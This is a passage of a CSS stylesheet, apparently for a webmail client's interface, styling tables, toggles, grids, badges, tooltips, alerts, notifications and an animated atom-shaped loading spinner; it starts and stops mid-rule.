            border: 1px solid #acb0bf
        }

        .pm_table table.absorbing {
            table-layout: auto
        }

        .pm_table table.absorbing td,
        .pm_table table.absorbing th {
            white-space: nowrap
        }

        .pm_table table.absorbing td.absorbing-column,
        .pm_table table.absorbing th.absorbing-column {
            width: 100%
        }

        .pm_table table.absorbing td.absorbing-column-half,
        .pm_table table.absorbing th.absorbing-column-half {
            width: 50%
        }

        .pm_table table.withDropDown>tbody>tr>td {
            padding: .5rem 1rem
        }

        .pm_table table.plain td,
        .pm_table table.plain th {
            line-height: normal;
            padding: 0;
            text-align: left;
            border: none
        }

        .pm_table table.plain td.text-center,
        .pm_table table.plain th.text-center {
            text-align: center
        }

        .pm_table table.plain td.text-right,
        .pm_table table.plain th.text-right {
            text-align: right
        }

        .pm_table table.plain th {
            color: #555;
            background: transparent;
            text-transform: none
        }

        .pm_table table.plain td,
        .pm_table table.plain th {
            line-height: 1.75rem;
            height: 1.75rem;
            vertical-align: top
        }

        .pm_table table.plain td strong {
            font-weight: 700
        }

        .pm_table table td,
        .pm_table table th {
            line-height: 36px;
            padding: 0 1rem;
            text-align: left;
            vertical-align: top
        }

        .pm_table table td .fa.fa-sort,
        .pm_table table th .fa.fa-sort {
            color: #6f6f6f;
            margin-right: .25rem;
            cursor: pointer
        }

        .pm_table table td .pm_button,
        .pm_table table th .pm_button {
            margin: 0;
            height: 36px;
            line-height: 36px
        }

        .pm_table table td .pm_button.round,
        .pm_table table th .pm_button.round {
            width: 36px
        }

        .pm_table table td .pm_select,
        .pm_table table th .pm_select {
            margin: 4px 0 -11px
        }

        .pm_table table td .pm_badge,
        .pm_table table th .pm_badge {
            margin: 0
        }

        .pm_table table td.checkbox,
        .pm_table table th.checkbox {
            width: 35px;
            padding: 0
        }

        .pm_table table td.checkbox label,
        .pm_table table th.checkbox label {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            width: 100%
        }

        .pm_table table td>span:not(.pm_buttons),
        .pm_table table th>span:not(.pm_buttons) {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            max-width: 100%
        }

        .pm_table table td>span:not(.pm_buttons).pm_badge,
        .pm_table table th>span:not(.pm_buttons).pm_badge {
            vertical-align: middle
        }

        .pm_table table th {
            background: #e6eaf0;
            border-bottom: 1px solid rgba(172, 176, 191, .1);
            color: #6f6f6f;
            font-weight: 400;
            text-transform: uppercase
        }

        .pm_table table th a {
            font-weight: 700;
            color: #9397cd
        }

        .pm_table table th .fa {
            color: #9397cd
        }

        .pm_table table td {
            border-bottom: 1px solid rgba(172, 176, 191, .1);
            color: #555
        }

        .pm_table table td .pm_select.table_select select {
            height: 30px;
            line-height: 30px
        }

        .pm_table table tr.hasTable {
            background-color: rgba(0, 0, 0, .05)
        }

        .pm_table table tr.hasTable table {
            background-color: #fff
        }

        .pm_table table tr.disabled td {
            color: #6f6f6f
        }

        .pm_toggle {
            position: relative;
            width: 8rem;
            border-radius: 2rem;
            height: 2rem;
            line-height: 2rem;
            background: #f4f4f4;
            -webkit-box-shadow: 0 0 0 1px #acb0bf;
            box-shadow: 0 0 0 1px #acb0bf
        }

        .pm_toggle.small {
            -webkit-transform: scale(.8);
            transform: scale(.8);
            -webkit-transform-origin: right center;
            transform-origin: right center
        }

        .pm_toggle.disabled {
            pointer-events: none
        }

        .pm_toggle.disabled.off span.off,
        .pm_toggle.disabled.on span.on {
            background-color: #e3e4f2
        }

        .pm_toggle span {
            position: absolute;
            width: 4rem;
            display: block;
            bottom: 0;
            top: 0;
            z-index: 1;
            height: 2rem;
            line-height: 2rem;
            text-align: center;
            font-size: .9em;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            -o-user-select: none;
            user-select: none;
            -webkit-transition: left .25s ease, opacity .25s ease;
            transition: left .25s ease, opacity .25s ease
        }

        .pm_toggle span.off,
        .pm_toggle span.on {
            z-index: 3;
            cursor: pointer
        }

        .pm_toggle span.on {
            border-radius: 2rem 0 0 2rem;
            left: 0;
            right: auto
        }

        .pm_toggle span.off {
            border-radius: 0 2rem 2rem 0;
            right: 0;
            left: auto
        }

        .pm_toggle span.knob {
            border-radius: 2rem;
            z-index: 2;
            background: #fff;
            border: 1px solid #acb0bf;
            margin: -1px
        }

        .pm_toggle.on .knob {
            left: 0
        }

        .pm_toggle.on .on {
            background-color: #9397cd;
            border-radius: 2rem;
            color: #fff
        }

        .pm_toggle.on .off {
            opacity: .35
        }

        .pm_toggle.on .off:hover {
            opacity: 1
        }

        .pm_toggle.off .knob {
            left: 4rem
        }

        .pm_toggle.off .on {
            opacity: .35
        }

        .pm_toggle.off .on:hover {
            opacity: 1
        }

        .pm_toggle.off .off {
            background-color: #9397cd;
            border-radius: 2rem;
            color: #fff
        }

        .pm_tabs {
            border-right: 1px solid #acb0bf
        }

        .pm_tabs,
        .pm_tabs li {
            display: block;
            list-style-type: none;
            float: left;
            margin: 0;
            padding: 0
        }

        .pm_tabs li a {
            text-transform: uppercase;
            background-color: #fafafa;
            border-radius: 0;
            border-right: none
        }

        .pm_tabs li.active a {
            background-color: #fff;
            border-bottom-color: transparent;
            color: #9397cd
        }

        body.appConfigBody-is-mobile .pm_tabs li a {
            padding: 0 5px;
            font-size: 10px
        }

        .pm_sort-container {
            padding: 0;
            margin: 0;
            list-style-type: none;
            border: 1px solid #acb0bf;
            border-bottom: 0
        }

        .pm_sort-item {
            list-style-type: none;
            position: relative
        }

        .pm_sort-item-content,
        .pm_sort-item-content>* {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: start;
            -webkit-justify-content: flex-start;
            -ms-flex-pack: start;
            justify-content: flex-start;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap
        }

        .pm_sort-item-content {
            padding: 5px 1rem;
            min-height: 32px;
            border-bottom: 1px solid #acb0bf
        }

        .pm_sort-item-content>:first-child {
            -webkit-flex-wrap: nowrap;
            -ms-flex-wrap: nowrap;
            flex-wrap: nowrap;
            width: 40%;
            min-width: 200px;
            margin-right: auto
        }

        .pm_sort-item-content>:last-child {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end
        }

        .pm_sort-item-content {
            white-space: nowrap
        }

        .pm_sort-item-content .pm_badge {
            margin-left: 5px
        }

        .appConfigBody-is-mobile .pm_sort-container[data-as-sortable] {
            border-right: 40px solid rgba(80, 80, 97, .4)
        }

        .appConfigBody-is-mobile .pm_sort-item-content>:first-child {
            margin-right: auto;
            font-weight: 700
        }

        .appConfigBody-is-mobile .pm_sort-item-content>:last-child {
            width: 100%
        }

        .pm_grid {
            margin: 0 0 20px
        }

        .pm_grid .col-1-1,
        .pm_grid .col-1-2,
        .pm_grid .col-1-3,
        .pm_grid .col-1-4,
        .pm_grid .col-1-5,
        .pm_grid .col-1-6,
        .pm_grid .col-1-8,
        .pm_grid .col-2-3,
        .pm_grid .col-2-4,
        .pm_grid .col-2-5,
        .pm_grid .col-2-6,
        .pm_grid .col-2-8,
        .pm_grid .col-3-3,
        .pm_grid .col-3-4,
        .pm_grid .col-3-5,
        .pm_grid .col-3-6,
        .pm_grid .col-3-8,
        .pm_grid .col-4-4,
        .pm_grid .col-4-5,
        .pm_grid .col-4-6,
        .pm_grid .col-4-8,
        .pm_grid .col-5-5,
        .pm_grid .col-5-6,
        .pm_grid .col-5-8,
        .pm_grid .col-6-6,
        .pm_grid .col-6-8,
        .pm_grid .col-7-8,
        .pm_grid .col-8-8 {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .pm_grid.truncate>div {
            max-width: 100%;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .pm_grid.pad {
            padding: 20px 0 20px 20px
        }

        .pm_grid.pad [class*=col-]:last-of-type {
            padding-right: 20px
        }

        .pm_grid.no-margin {
            margin: 0
        }

        .pm_grid.no-padding,
        .pm_grid.no-padding [class*=col-] {
            padding: 0
        }

        .pm_grid:after {
            content: "";
            display: table;
            clear: both
        }

        .pm_grid [class*=col-] {
            float: left;
            padding-right: 20px
        }

        .pm_grid [class*=col-]:last-of-type {
            padding-right: 0
        }

        .pm_grid .col-1-8 {
            width: 12.5%
        }

        .pm_grid .col-1-6 {
            width: 16.6%
        }

        .pm_grid .col-1-5 {
            width: 20%
        }

        .pm_grid .col-1-4,
        .pm_grid .col-2-8 {
            width: 25%
        }

        .pm_grid .col-1-3,
        .pm_grid .col-2-6 {
            width: 33.33%
        }

        .pm_grid .col-3-8 {
            width: 37.5%
        }

        .pm_grid .col-2-5 {
            width: 40%
        }

        .pm_grid .col-1-2,
        .pm_grid .col-3-6,
        .pm_grid .col-4-8 {
            width: 50%
        }

        .pm_grid .col-3-5 {
            width: 60%
        }

        .pm_grid .col-5-8 {
            width: 62.5%
        }

        .pm_grid .col-2-3,
        .pm_grid .col-4-6 {
            width: 66.66%
        }

        .pm_grid .col-3-4,
        .pm_grid .col-6-8 {
            width: 75%
        }

        .pm_grid .col-4-5 {
            width: 80%
        }

        .pm_grid .col-5-6 {
            width: 83.3%
        }

        .pm_grid .col-7-8 {
            width: 87.5%
        }

        .pm_grid .col-1-1,
        .pm_grid .col-4-4,
        .pm_grid .col-5-5,
        .pm_grid .col-6-6,
        .pm_grid .col-8-8 {
            width: 100%
        }

        .pm_grid.hasImbricated {
            padding: 10px 20px;
            margin: 20px 0 0;
            border: 1px solid rgba(0, 0, 0, .1);
            border-top-left-radius: 2px;
            border-top-right-radius: 2px
        }

        .pm_grid.imbricated {
            margin: 0 0 20px;
            padding: 10px 20px;
            background-color: rgba(0, 0, 0, .05);
            border-bottom: 1px solid rgba(0, 0, 0, .1);
            border-left: 1px solid rgba(0, 0, 0, .1);
            border-right: 1px solid rgba(0, 0, 0, .1)
        }

        .pm_grid.flex {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .pm_grid.flex.flex-mobileShrink,
        .pm_grid.flex.flex-row {
            -webkit-flex-direction: row;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-direction: row;
            flex-direction: row
        }

        .pm_grid.flex>[class*=col-] {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            width: auto
        }

        .pm_grid.flex.absorbing>[class*=col-] {
            -webkit-flex-grow: 0;
            -webkit-box-flex: 0;
            -ms-flex-positive: 0;
            flex-grow: 0
        }

        .pm_grid.flex>[class*=col-].absorbe {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1
        }

        .pm_grid.flex>[class*=col-].initialGrow {
            -webkit-flex-grow: initial;
            -webkit-box-flex: initial;
            -ms-flex-positive: initial;
            flex-grow: 0
        }

        .pm_grid.flex>[class*=col-].initialGrow>* {
            white-space: nowrap
        }

        .pm_grid.flex>[class*=col-]:first-child:nth-last-child(3).double,
        .pm_grid.flex>[class*=col-]:first-child:nth-last-child(3)~[class*=col-].double {
            -webkit-box-flex: 2.3;
            -webkit-flex: 2.3;
            -ms-flex: 2.3;
            flex: 2.3
        }

        .pm_grid.flex>.col-basis {
            -webkit-flex-basis: 200px;
            -ms-flex-preferred-size: 200px;
            flex-basis: 200px
        }

        body.appConfigBody-is-mobile .pm_grid.flex:not(.flex-mobileShrink) {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        body.appConfigBody-is-mobile .pm_grid.flex:not(.flex-mobileShrink) [class*=col-] {
            margin-bottom: 20px
        }

        body.appConfigBody-is-mobile .pm_grid.flex-mobileShrink>[class*=col-] {
            white-space: nowrap
        }

        body.appConfigBody-is-mobile .pm_grid .col-basis {
            -webkit-flex-basis: 0px;
            -ms-flex-preferred-size: 0px;
            flex-basis: 0px
        }

        body.appConfigBody-is-mobile .pm_grid [class*=col-] {
            float: left;
            width: 100% !important;
            clear: both;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 0;
            margin-bottom: 10px
        }

        input[type=range].pm_range {
            -webkit-appearance: none;
            margin: 1rem 0;
            width: 100%
        }

        input[type=range].pm_range:focus {
            outline: none
        }

        input[type=range].pm_range::-webkit-slider-runnable-track {
            width: 100%;
            height: 6px;
            cursor: pointer;
            animate: .2s;
            border-radius: 6px;
            background: #acb0bf
        }

        input[type=range].pm_range::-webkit-slider-thumb {
            height: 16px;
            width: 16px;
            border-radius: 16px;
            background: #9397cd;
            cursor: pointer;
            -webkit-appearance: none;
            margin-top: -5px
        }

        input[type=range].pm_range:focus::-webkit-slider-runnable-track {
            background: #acb0bf
        }

        input[type=range].pm_range::-moz-range-track {
            width: 100%;
            height: 6px;
            cursor: pointer;
            animate: .2s;
            background: #9397cd;
            border-radius: 6px
        }

        input[type=range].pm_range::-moz-range-thumb {
            height: 16px;
            width: 16px;
            border-radius: 16px;
            background: #9397cd;
            cursor: pointer
        }

        input[type=range].pm_range::-ms-track {
            width: 100%;
            height: 6px;
            cursor: pointer;
            animate: .2s;
            background: #9397cd;
            border-width: 6px;
            color: transparent
        }

        input[type=range].pm_range::-ms-fill-lower {
            background: #acb0bf;
            border-radius: 6px
        }

        input[type=range].pm_range::-ms-fill-upper {
            background: #9397cd;
            border-radius: 6px
        }

        input[type=range].pm_range::-ms-thumb {
            height: 16px;
            width: 16px;
            border-radius: 16px;
            background: #9397cd;
            cursor: pointer
        }

        input[type=range].pm_range:focus::-ms-fill-lower {
            background: #acb0bf
        }

        input[type=range].pm_range:focus::-ms-fill-upper {
            background: #9397cd
        }

        .pm_tag {
            margin: 0 .5rem;
            border-radius: 2px;
            line-height: 14px;
            height: 14px;
            font-size: 10px;
            position: relative;
            top: -1px;
            color: #222 !important
        }

        .pm_badge,
        .pm_tag {
            font-style: normal;
            background: #e1e1e1;
            padding: 0 .35rem;
            display: inline-block
        }

        .pm_badge {
            border-radius: .25em;
            color: #fff;
            font-size: 75%;
            height: 1.5rem;
            line-height: 1.5rem;
            margin: .25rem 0;
            text-transform: uppercase
        }

        .pm_badge.none {
            text-transform: none;
            font-weight: 700
        }

        .pm_badge.default {
            color: #555
        }

        .pm_badge.primary {
            background-color: #9397cd
        }

        .pm_badge.success {
            background-color: #a6cc93
        }

        .pm_badge.error {
            background-color: #cc9393
        }

        .pm_badge.warning {
            background-color: #e7d360
        }

        .pm-flex-content,
        .pm-flex-content-vertical-center {
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-height: 0
        }

        .pm-flex-content,
        .pm-flex-content-row,
        .pm-flex-content-vertical-center {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex
        }

        .pm-flex-content-row.alignItemsCenter {
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center
        }

        .pm-flex-content-row.justifyContentCenter {
            -webkit-justify-content: center;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            justify-content: center
        }

        .pm-flex-content-row.justifyEnd {
            -webkit-justify-content: flex-end;
            -webkit-box-pack: end;
            -ms-flex-pack: end;
            justify-content: flex-end
        }

        .pm-flex-content-vertical-center {
            -webkit-justify-content: center;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            justify-content: center
        }

        .pm-flex-content-vertical-end {
            -webkit-justify-content: flex-end;
            -webkit-box-pack: end;
            -ms-flex-pack: end;
            justify-content: flex-end
        }

        .pm-flex-content-autoWidth {
            -webkit-align-self: flex-start;
            -ms-flex-item-align: start;
            align-self: flex-start
        }

        .pm-flex-content-alignRight {
            -webkit-align-self: flex-end;
            -ms-flex-item-align: end;
            align-self: flex-end
        }

        .pm-flex-content-fillHeight,
        .pm-flex-content-fillWidth {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1
        }

        .pm-flex-content-fillWidth {
            min-width: 0
        }

        .pm-flex-content-fillHeight {
            min-height: 0
        }

        .tooltip {
            position: absolute;
            z-index: 99999;
            opacity: 0;
            -webkit-transition: opacity .1s linear;
            transition: opacity .1s linear;
            border: 0
        }

        .tooltip.in {
            opacity: 1
        }

        .tooltip.top {
            padding: 5px 0;
            margin-top: -3px
        }

        .tooltip.right {
            padding: 0 5px;
            margin-left: 3px
        }

        .tooltip.bottom {
            padding: 5px 0;
            margin-top: 3px
        }

        .tooltip.left {
            padding: 0 5px;
            margin-left: -3px
        }

        .tooltip-inner {
            padding: 10px 15px;
            max-width: 500px;
            text-align: center;
            color: #fff;
            background-color: #393945;
            border-radius: 2px
        }

        .tooltip-arrow {
            position: absolute;
            width: 0;
            height: 0;
            border-color: transparent;
            border-style: solid
        }

        .tooltip.top .tooltip-arrow {
            bottom: 0;
            left: 50%;
            margin-left: -5px;
            border-width: 5px 5px 0;
            border-top-color: #393945
        }

        .tooltip.top-left .tooltip-arrow {
            right: 5px
        }

        .tooltip.top-left .tooltip-arrow,
        .tooltip.top-right .tooltip-arrow {
            bottom: 0;
            margin-bottom: -5px;
            border-width: 5px 5px 0;
            border-top-color: #393945
        }

        .tooltip.top-right .tooltip-arrow {
            left: 5px
        }

        .tooltip.right .tooltip-arrow {
            top: 50%;
            left: 0;
            margin-top: -5px;
            border-width: 5px 5px 5px 0;
            border-right-color: #393945
        }

        .tooltip.left .tooltip-arrow {
            top: 50%;
            right: 0;
            margin-top: -5px;
            border-width: 5px 0 5px 5px;
            border-left-color: #393945
        }

        .tooltip.bottom .tooltip-arrow {
            top: 0;
            left: 50%;
            margin-left: -5px;
            border-width: 0 5px 5px;
            border-bottom-color: #393945
        }

        .tooltip.bottom-left .tooltip-arrow {
            top: 0;
            right: 5px;
            margin-top: -5px;
            border-width: 0 5px 5px;
            border-bottom-color: #393945
        }

        .tooltip.bottom-right .tooltip-arrow {
            top: 0;
            left: 5px;
            margin-top: -5px;
            border-width: 0 5px 5px;
            border-bottom-color: #393945
        }

        .alert {
            padding: 15px 20px;
            border-radius: 4px;
            background: #f0f0f0;
            color: #717171
        }

        .alert a {
            font-weight: 500;
            color: #000
        }

        .alert.alert-info {
            background: #e3e4f2;
            color: #444992
        }

        .alert.alert-success {
            background: #a6cc93;
            color: #2a411f
        }

        .alert.alert-danger {
            background: #cf9696;
            color: #462020
        }

        .alert.alert-warning {
            background: #d9c4a2;
            color: #584424
        }

        .alert .pm_select,
        .alert input[type=email],
        .alert input[type=number],
        .alert input[type=password],
        .alert input[type=search],
        .alert input[type=text],
        .alert textarea {
            background: #fff !important
        }

        body .cg-notify-message {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            background: #43434f;
            -webkit-box-shadow: inset 0 -1px 0 1px rgba(0, 0, 0, .1), 0 1px 1px rgba(0, 0, 0, .5);
            box-shadow: inset 0 -1px 0 1px rgba(0, 0, 0, .1), 0 1px 1px rgba(0, 0, 0, .5);
            color: #fff !important;
            text-shadow: 0 1px 0 rgba(0, 0, 0, .1);
            border: none;
            padding: .75rem 1.25rem;
            z-index: 9999999 !important;
            font-size: 110%
        }

        body .cg-notify-message.notification-success {
            background-color: #a6cc93
        }

        body .cg-notify-message.notification-warning {
            background-color: #e7d360
        }

        body .cg-notify-message.notification-danger {
            background-color: #cc9393
        }

        body .cg-notify-message.notification-info {
            background-color: #505061
        }

        body .cg-notify-message.bottom-right {
            right: 2rem !important;
            bottom: 1rem !important;
            top: auto !important;
            left: auto !important
        }

        body .cg-notify-message .cg-notify-message-content {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        body .cg-notify-message .cg-notify-text-muted {
            cursor: pointer;
            margin-left: .75rem
        }

        .cg-notify-message>div:first-of-type {
            max-width: 100%;
            word-wrap: break-word
        }

        @media (max-width:800px) {
            html body .cg-notify-message {
                width: 100% !important;
                left: 0 !important;
                right: 0 !important;
                margin: 0 !important;
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
                border-radius: 0 !important;
                top: 0 !important;
                max-width: none !important
            }
        }

        .scrollbar-track.scrollbar-track-y {
            opacity: 1 !important;
            display: block !important
        }

        .sidebar .scrollbar-thumb {
            max-height: 50% !important
        }

        .toggle-switch {
            border-radius: 1rem
        }

        .toggle-switch .switch-left {
            border-radius: 1rem 0 0 1rem
        }

        .toggle-switch .knob {
            border-radius: 1rem
        }

        .toggle-switch .switch-right {
            border-radius: 0 1rem 1rem 0
        }

        .proton-embedded:not([src]) {
            position: relative;
            min-height: 38px;
            border: 1px solid;
            border-color: #444 #ccc #ccc #444;
            background: url(assets/img/broken-img.png) no-repeat 0 50% #fff
        }

        .ua-chrome .proton-embedded:not([src]):not([alt]),
        .ua-safari .proton-embedded:not([src]) {
            border: 0
        }

        .ua-edge .proton-embedded[alt]:not([src]),
        .ua-ie .proton-embedded[alt]:not([src]),
        .ua-safari .proton-embedded[alt]:not([src]) {
            background-position-y: 80%
        }

        .proton-embedded:not([src]):not([alt]) {
            background-position-x: 50%
        }

        .proton-embedded[alt]:not([src]):after {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            content: " " attr(alt);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            padding: 10px 0 0 20px;
            color: rgba(0, 0, 0, .5);
            background: url(assets/img/broken-img.png) no-repeat 0 50% #fff
        }

        .proton-embedded:not([width]):not([style*=width]) {
            max-width: 100%;
            min-width: 38px
        }

        .flex-grid {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row
        }

        .flex-grid>* {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        body.mobileMode .flex-grid {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .pm_noscript {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 100px 2em 0;
            background: url(assets/img/logo.svg) no-repeat #505061 50%;
            background-size: 200px;
            color: #fff;
            font-size: 1.2em
        }

        .ptdnd-dragstart {
            cursor: move;
            cursor: -webkit-grabbing;
            cursor: grabbing
        }

        .ptdnd-dragstart .conversation *,
        .ptdnd-dragstart .mCSB_scrollTools_vertical,
        .ptdnd-dragstart [data-pt-dropzone-item] * {
            pointer-events: none
        }

        .ptdnd-drag-start {
            opacity: .5
        }

        .ptdnd-notification {
            position: absolute;
            z-index: 99999;
            background: #fff;
            border: 1px solid #929292;
            padding: .5em 1em;
            font-size: .9em;
            top: 10px;
            left: 10px;
            -webkit-transform: translate(0);
            transform: translate(0)
        }

        .ptdnd-notification-firefox {
            z-index: 0
        }

        .ptdnd-notification:not(.ptdnd-notification-active) {
            display: none
        }

        .appVersion-container:before {
            content: attr(data-prefix)
        }

        .appCopyright-container:before {
            content: "\A9";
            margin-right: .5em
        }

        .atomLoader {
            color: #fff
        }

        .atomLoader-container {
            margin: 0 auto 20px;
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            width: 130px;
            height: 130px;
            -webkit-animation: atomRotate 25s linear infinite;
            animation: atomRotate 25s linear infinite;
            will-change: transform
        }

        .atomLoader-item,
        .atomLoader-item2,
        .atomLoader-item3 {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: -8px;
            border-right: 6px solid #fff;
            border-left: 6px solid #fff;
            border-radius: 100%
        }

        .atomLoader-item {
            -webkit-animation: atomLoader-item 2s linear infinite;
            animation: atomLoader-item 2s linear infinite
        }

        .atomLoader-item2 {
            -webkit-animation: atomLoader-item2 3s linear infinite;
            animation: atomLoader-item2 3s linear infinite;
            -webkit-animation-delay: -1s;
            animation-delay: -1s
        }

        .atomLoader-item3 {
            -webkit-animation: atomLoader-item3 4s linear infinite;
            animation: atomLoader-item3 4s linear infinite
        }

        .atomLoader-proton {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #fff;
            animation: atomRotate 20s linear infinite reverse
        }

        .atomLoader-text {
            position: relative;
            text-align: center;
            color: inherit
        }

        .atomLoader-text:empty {
            display: none
        }

        .atomLoader-text:after {
            position: absolute;
            overflow: hidden;
            display: inline-block;
            -webkit-animation: ellipsis steps(4) .9s infinite;
            animation: ellipsis steps(4) .9s infinite;
            content: "\2026";
            width: 0
        }

        .atomLoader.primary {
            color: #9397cd
        }

        .atomLoader.primary .atomLoader-proton {
            background: #9397cd
        }

        .atomLoader.primary .atomLoader-item,
        .atomLoader.primary .atomLoader-item2,
        .atomLoader.primary .atomLoader-item3 {
            border-color: #9397cd
        }

        .atomLoader.dark {
            color: #505061
        }

        .atomLoader.dark .atomLoader-proton {
            background: #505061
        }

        .atomLoader.dark .atomLoader-item,
        .atomLoader.dark .atomLoader-item2,
        .atomLoader.dark .atomLoader-item3 {
            border-color: #505061
        }

        @-webkit-keyframes atomLoader-item {
            0% {
                -webkit-transform: rotate(120deg) rotateX(70deg) rotate(0deg);
                transform: rotate(120deg) rotateX(70deg) rotate(0deg)
            }

            to {
                -webkit-transform: rotate(120deg) rotateX(70deg) rotate(1turn);
                transform: rotate(120deg) rotateX(70deg) rotate(1turn)
            }
        }

        @keyframes atomLoader-item {
            0% {
                -webkit-transform: rotate(120deg) rotateX(70deg) rotate(0deg);
                transform: rotate(120deg) rotateX(70deg) rotate(0deg)
            }

            to {
                -webkit-transform: rotate(120deg) rotateX(70deg) rotate(1turn);
                transform: rotate(120deg) rotateX(70deg) rotate(1turn)
            }
        }

        @-webkit-keyframes atomLoader-item2 {
            0% {
                -webkit-transform: rotate(60deg) rotateX(70deg) rotate(0deg);
                transform: rotate(60deg) rotateX(70deg) rotate(0deg)
            }

            to {
                -webkit-transform: rotate(60deg) rotateX(70deg) rotate(1turn);
                transform: rotate(60deg) rotateX(70deg) rotate(1turn)
            }
        }

        @keyframes atomLoader-item2 {
            0% {
                -webkit-transform: rotate(60deg) rotateX(70deg) rotate(0deg);
                transform: rotate(60deg) rotateX(70deg) rotate(0deg)
            }

            to {
                -webkit-transform: rotate(60deg) rotateX(70deg) rotate(1turn);
                transform: rotate(60deg) rotateX(70deg) rotate(1turn)
            }
        }

        @-webkit-keyframes atomLoader-item3 {
            0% {
                -webkit-transform: rotate(1turn) rotateX(70deg) rotate(0deg);
                transform: rotate(1turn) rotateX(70deg) rotate(0deg)
            }

            to {
                -webkit-transform: rotate(1turn) rotateX(70deg) rotate(1turn);
                transform: rotate(1turn) rotateX(70deg) rotate(1turn)
            }
        }

        @keyframes atomLoader-item3 {
            0% {
                -webkit-transform: rotate(1turn) rotateX(70deg) rotate(0deg);
                transform: rotate(1turn) rotateX(70deg) rotate(0deg)
            }

            to {
                -webkit-transform: rotate(1turn) rotateX(70deg) rotate(1turn);
                transform: rotate(1turn) rotateX(70deg) rotate(1turn)
            }
        }

        @-webkit-keyframes atomRotate {
            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @keyframes atomRotate {
            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @keyframes ellipsis {
            to {
                width: 1.25em
            }
        }

        @-webkit-keyframes ellipsis {
            to {
                width: 1.25em
            }
        }

        @media (-ms-high-contrast:active),
        (-ms-high-contrast:none) {

            .atomLoader-container .atomLoader-item,
            .atomLoader-container .atomLoader-item2,
            .atomLoader-container .atomLoader-item3,
            .atomLoader-container .atomLoader-proton {
                display: none
            }

            .atomLoader-container,
            .atomLoader-container .atomLoader-item,
            .atomLoader-container .atomLoader-item2,
            .atomLoader-container .atomLoader-item3,
            .atomLoader-container .atomLoader-proton,
            .atomLoader .atomLoader-text:after {
                -webkit-animation: none;
                animation: none
            }

            .atomLoader-text:after {
                width: auto
            }

            .atomLoader-container {
                background: url(assets/img/decrypt.gif) no-repeat 50%
            }

            .atomLoader.primary .atomLoader-container {
                background-image: url(assets/img/decrypt1.gif)
            }

            .pm-loader-fullpage .atomLoader-container {
